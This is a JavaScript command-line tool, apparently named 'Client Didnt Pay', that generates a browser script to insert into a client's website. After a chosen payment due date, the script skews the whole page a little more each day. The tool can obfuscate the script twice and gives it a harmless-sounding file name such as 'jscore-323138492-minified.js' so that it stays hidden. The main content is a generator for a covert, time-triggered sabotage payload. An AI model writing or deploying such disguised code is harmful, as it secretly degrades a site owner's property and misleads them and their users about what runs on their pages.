// -----------------------------------------------------------------------------
// Copyright (c) 2021 Siddharth Ray
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
// -----------------------------------------------------------------------------

const Console = require('Console')
const prompts = require('prompts')
const fs = require('fs')
const JavaScriptObfuscator = require('javascript-obfuscator')

Console.success(`  ______   __  __                        __            _______   __        __           __  __            _______                     
/      \ /  |/  |                      /  |          /       \ /  |      /  |         /  |/  |          /       \                    
/$$$$$$  |$$ |$$/   ______   _______   _$$ |_         $$$$$$$  |$$/   ____$$ | _______ $$/_$$ |_         $$$$$$$  | ______   __    __ 
$$ |  $$/ $$ |/  | /      \ /       \ / $$   |        $$ |  $$ |/  | /    $$ |/       \$// $$   |        $$ |__$$ |/      \ /  |  /  |
$$ |      $$ |$$ |/$$$$$$  |$$$$$$$  |$$$$$$/         $$ |  $$ |$$ |/$$$$$$$ |$$$$$$$  | $$$$$$/         $$    $$/ $$$$$$  |$$ |  $$ |
$$ |   __ $$ |$$ |$$    $$ |$$ |  $$ |  $$ | __       $$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |   $$ | __       $$$$$$$/  /    $$ |$$ |  $$ |
$$ \__/  |$$ |$$ |$$$$$$$$/ $$ |  $$ |  $$ |/  |      $$ |__$$ |$$ |$$ \__$$ |$$ |  $$ |   $$ |/  |      $$ |     /$$$$$$$ |$$ \__$$ |
$$    $$/ $$ |$$ |$$       |$$ |  $$ |  $$  $$/       $$    $$/ $$ |$$    $$ |$$ |  $$ |   $$  $$/       $$ |     $$    $$ |$$    $$ |
$$$$$$/  $$/ $$/  $$$$$$$/ $$/   $$/    $$$$/        $$$$$$$/  $$/  $$$$$$$/ $$/   $$/     $$$$/        $$/       $$$$$$$/  $$$$$$$ |
                                                                                                                           /  \__$$ |
                                                                                                                           $$    $$/ 
                                                                                                                            $$$$$$/  
`)

Console.stress('Starting CDP CLI...')

const questions = [
    {
        type: 'number',
        name: 'duedate',
        message: 'When is the pay due (Enter Epoch Timestamp, eg 1627411841)?'
    },
    {
        type: 'confirm',
        name: 'hide',
        message: 'Should I obscure the code in order to hide it?'
    },
    {
        type: 'text',
        name: 'filename',
        message: 'Name the Script file (requires .js extension)',
        initial: 'jscore-323138492-minified.js'
    }
];

(async () => {
    const response = await prompts(questions);

    Console.log(`\nGenerating Code...`)
    fileCode = `document.addEventListener("DOMContentLoaded", function(){
        const startDate = ${response.duedate};
    const currentDate = new Date();
    
    const diffInMs = new Date(currentDate) - new Date(startDate)
    const diffInDays = Math.floor(diffInMs / (1000 * 60 * 60 * 24));
    var rotate=0;
    if(diffInDays>0){
        rotate=diffInDays*2;
        if(diffInDays>15){
            rotate=30;
            
        }
    }
    document.getElementsByTagName('body')[0].style  = 'transform: skewY(' + rotate + 'deg)'
});`
    Console.success('Finished Generating Code!')
    Console.log('Writing File...')
    fs.writeFileSync(`../${response.filename}`, fileCode);
    Console.success(`Finished Writing ${response.filename}!`)
    if (response.hide) {
        Console.log('Obscuring ' + response.filename + '...')
        const obCode = JavaScriptObfuscator.obfuscate(fs.readFileSync(`../${response.filename}`, 'utf8'), {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            shuffleStringArray: true,
            splitStrings: true,
            stringArrayThreshold: 0
        })
        fs.writeFileSync(`../${response.filename}`, obCode.getObfuscatedCode())
        const obCode2 = JavaScriptObfuscator.obfuscate(fs.readFileSync(`../${response.filename}`, 'utf8'), {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            shuffleStringArray: true,
            splitStrings: true,
            stringArrayThreshold: 0
        })
        fs.writeFileSync(`../${response.filename}`, obCode2.getObfuscatedCode())
        Console.success(`Finished Obfuscating ${response.filename}!`)
    }
    Console.stress('\n\nInsert the following tag in your HTML Pages (if the HTML pages are not in the root folder, edit the path of the src tag)')
    console.log(`<\x1b[34mscript \x1b[36msrc\x1b[37m=\x1b[33m"./${response.filename}"\x1b[37m></\x1b[34mscript\x1b[37m>`)
})();
